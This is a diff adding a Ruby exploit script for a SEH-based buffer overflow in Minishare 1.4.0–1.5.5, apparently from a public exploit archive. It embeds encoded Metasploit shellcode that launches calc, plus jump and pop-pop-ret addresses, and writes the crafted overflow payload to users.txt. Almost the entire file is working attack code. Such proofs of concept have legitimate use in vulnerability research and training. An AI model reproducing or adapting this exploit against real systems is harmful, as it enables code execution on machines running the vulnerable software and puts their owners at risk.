@@ -1,0 +1,51 @@
+# Exploit Title: Minishare 1.5.5 Buffer Overflow Vulnerability (SEH)
+# Date: 11/03/2010
+# Author: Muhamad Fadzil Ramli - mind1355[at]gmail[dot]com
+# Credit/Bug Found By: Chris Gabriel
+# Software Link: http://sourceforge.net/projects/minishare
+# Version: 1.4.0 - 1.5.5
+# Tested on: Windows XP SP3 EN (VMWARE FUSION - Version 3.1.1)
+# CVE: N/A
+ 
+#! /usr/bin/env ruby
+filename = 'users.txt'
+
+# windows/exec - 144 bytes
+# http://www.metasploit.com
+# Encoder: x86/shikata_ga_nai
+# EXITFUNC=seh, CMD=calc
+shellcode = ''
+shellcode <<  "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc"
+shellcode << "\xd9\x74\x24\xf4\xb1\x1e\x58\x31\x78"
+shellcode << "\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85"
+shellcode << "\x30\x78\xbc\x65\xc9\x78\xb6\x23\xf5"
+shellcode << "\xf3\xb4\xae\x7d\x02\xaa\x3a\x32\x1c"
+shellcode << "\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21"
+shellcode << "\xe7\x96\x60\xf5\x71\xca\x06\x35\xf5"
+shellcode << "\x14\xc7\x7c\xfb\x1b\x05\x6b\xf0\x27"
+shellcode << "\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3"
+shellcode << "\xf7\x3b\x7a\xcf\x4c\x4f\x23\xd3\x53"
+shellcode << "\xa4\x57\xf7\xd8\x3b\x83\x8e\x83\x1f"
+shellcode << "\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6"
+shellcode << "\xf5\xc1\x7e\x98\xf5\xaa\xf1\x05\xa8"
+shellcode << "\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"
+shellcode << "\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f"
+shellcode << "\x59\x90\x7b\xd7\x05\x7f\xe8\x7b\xca"
+
+nearjmp = "\xe9\x98\xfe\xff\xff" # near jmp 168 bytes
+nseh	= [0xfffff9eb].pack('V') # short jmp 7 bytes
+seh		= [0x0040B145].pack('V') # ppr
+
+junk1 	= "\x90" * (386 - (shellcode + nearjmp).length)
+junk2	= 'B' * (1000 - (junk1 + shellcode + nearjmp + nseh + seh).length)
+
+# [nops][ shellcode][near jmp][nseh (short jmp)][seh (pop pop ret)][junk2]
+# (3)^                (2)^_______|_______| ^                |(1)
+#    |___________________________|         |________________|
+
+xploit = junk1 + shellcode + nearjmp + nseh + seh + junk2
+
+File.open(filename,'w') do |fd|
+	fd.write xploit
+	puts "file size	: #{xploit.length.to_s}"
+end
